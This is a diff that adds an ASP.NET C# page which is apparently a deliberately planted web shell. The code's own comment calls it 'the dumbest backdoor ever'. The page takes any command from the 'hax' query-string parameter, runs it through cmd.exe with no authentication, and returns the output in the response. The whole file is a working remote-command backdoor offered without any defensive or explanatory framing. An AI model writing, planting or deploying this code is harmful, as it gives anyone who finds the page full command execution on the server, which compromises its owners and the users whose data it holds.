@@ -1,0 +1,29 @@
+<%@ Page Language="C#" Debug="true" Trace="false" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script Language="c#" runat="server">
+void Page_Load(object sender, EventArgs e)
+{
+    // dumbest backdoor ever
+
+    string cmd = Request.QueryString["hax"];
+
+    if (cmd != null)
+    {
+        Response.Write(Execute(cmd));
+    }
+}
+string Execute(string arg)
+{
+    ProcessStartInfo info = new ProcessStartInfo();
+    info.FileName = "cmd.exe";
+    info.Arguments = "/c "+arg;
+    info.RedirectStandardOutput = true;
+    info.UseShellExecute = false;
+    Process p = Process.Start(info);
+    StreamReader reader = p.StandardOutput;
+    string result = reader.ReadToEnd();
+    reader.Close();
+    return result;
+}
+</script>
